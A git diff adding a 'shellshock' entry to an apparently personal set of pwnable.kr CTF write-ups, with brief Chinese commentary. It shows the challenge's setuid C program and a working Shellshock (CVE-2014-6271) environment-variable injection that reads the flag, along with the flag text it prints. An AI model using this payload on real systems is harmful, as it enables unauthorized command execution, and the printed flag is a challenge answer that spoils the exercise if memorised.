@@ -10,6 +10,7 @@
     * [input](#toddlers-bottle---input)
     * [leg-TODO](#toddlers-bottle---leg)
     * [mistake](#toddlers-bottle---mistake)
+    * [shellshock](#toddlers-bottle---shellshock)
 
 ### Toddler's Bottle - fd
 
@@ -782,3 +783,25 @@ Password OK
 Mommy, the operator priority always confuses me :(
 mistake@ubuntu:~$
 ```
+
+### Toddler's Bottle - shellshock
+
+```c
+#include <stdio.h>
+int main(){
+    setresuid(getegid(), getegid(), getegid());
+    setresgid(getegid(), getegid(), getegid());
+    system("/home/shellshock/bash -c 'echo shock_me'");
+    return 0;
+}
+```
+
+这题是一个 *shellshock* 的漏洞，简单看了下其他人的实现。[shellshock(software bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
+
+```sh
+shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+```
+
+参考资料：[（十一）：pwnable-shellshock](https://etenal.me/archives/972#C11)
